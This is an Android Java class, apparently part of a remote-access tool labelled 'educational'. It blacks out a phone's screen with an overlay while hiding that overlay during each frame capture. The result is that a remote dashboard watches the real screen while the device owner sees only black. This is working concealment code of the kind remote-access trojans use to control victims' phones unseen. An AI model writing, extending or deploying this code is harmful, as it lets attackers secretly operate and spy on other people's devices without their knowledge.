package com.remoteaccess.educational.commands;

import android.content.Context;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import org.json.JSONObject;

/**
 * ScreenBlackout — draws a full-screen opaque black overlay using WindowManager.
 *
 * The physical device screen appears completely blank (black) while the dashboard
 * can still receive stream frames (the overlay is briefly hidden before each capture).
 *
 * Requires: android.permission.SYSTEM_ALERT_WINDOW
 */
public class ScreenBlackout {

    private static final String TAG = "ScreenBlackout";

    private final Context       context;
    private final WindowManager windowManager;
    private final Handler       mainHandler = new Handler(Looper.getMainLooper());

    private View    overlayView;
    private boolean active = false;

    private static ScreenBlackout instance;

    public static synchronized ScreenBlackout getInstance(Context context) {
        if (instance == null) instance = new ScreenBlackout(context.getApplicationContext());
        return instance;
    }

    private ScreenBlackout(Context context) {
        this.context       = context;
        this.windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
    }

    public boolean isActive() { return active; }

    /** Enable the black screen overlay on the device. */
    public JSONObject enableBlackout() {
        JSONObject result = new JSONObject();
        try {
            if (active) {
                result.put("success", true);
                result.put("message", "Screen blackout already active");
                return result;
            }

            mainHandler.post(() -> {
                try {
                    overlayView = new View(context);
                    overlayView.setBackgroundColor(Color.BLACK);

                    int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                            ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                            : WindowManager.LayoutParams.TYPE_PHONE;

                    WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.MATCH_PARENT,
                            type,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                    | WindowManager.LayoutParams.FLAG_FULLSCREEN,
                            PixelFormat.OPAQUE
                    );

                    windowManager.addView(overlayView, params);
                    active = true;
                    Log.i(TAG, "Screen blackout ENABLED");
                } catch (Exception e) {
                    Log.e(TAG, "enableBlackout error: " + e.getMessage());
                }
            });

            result.put("success", true);
            result.put("message", "Screen blackout enabled — device screen is now black");
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    /** Disable the black screen overlay. */
    public JSONObject disableBlackout() {
        JSONObject result = new JSONObject();
        try {
            if (!active || overlayView == null) {
                result.put("success", true);
                result.put("message", "Screen blackout already inactive");
                return result;
            }

            mainHandler.post(() -> {
                try {
                    windowManager.removeView(overlayView);
                    overlayView = null;
                    active = false;
                    Log.i(TAG, "Screen blackout DISABLED");
                } catch (Exception e) {
                    Log.e(TAG, "disableBlackout error: " + e.getMessage());
                }
            });

            result.put("success", true);
            result.put("message", "Screen blackout disabled — device screen is visible again");
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    /**
     * Briefly hide the overlay, run the capture runnable, then show it again.
     * This allows the dashboard stream to see real content while device shows black.
     * Called from the streaming thread — blocks briefly on the main thread.
     */
    public void runWithOverlayHidden(Runnable captureTask) {
        if (!active || overlayView == null) {
            captureTask.run();
            return;
        }

        final Object lock = new Object();
        final boolean[] done = {false};

        mainHandler.post(() -> {
            try {
                overlayView.setVisibility(View.INVISIBLE);
                captureTask.run();
            } finally {
                if (overlayView != null) overlayView.setVisibility(View.VISIBLE);
                synchronized (lock) { done[0] = true; lock.notifyAll(); }
            }
        });

        synchronized (lock) {
            long deadline = System.currentTimeMillis() + 300;
            while (!done[0] && System.currentTimeMillis() < deadline) {
                try { lock.wait(50); } catch (InterruptedException ignored) { break; }
            }
        }
    }
}
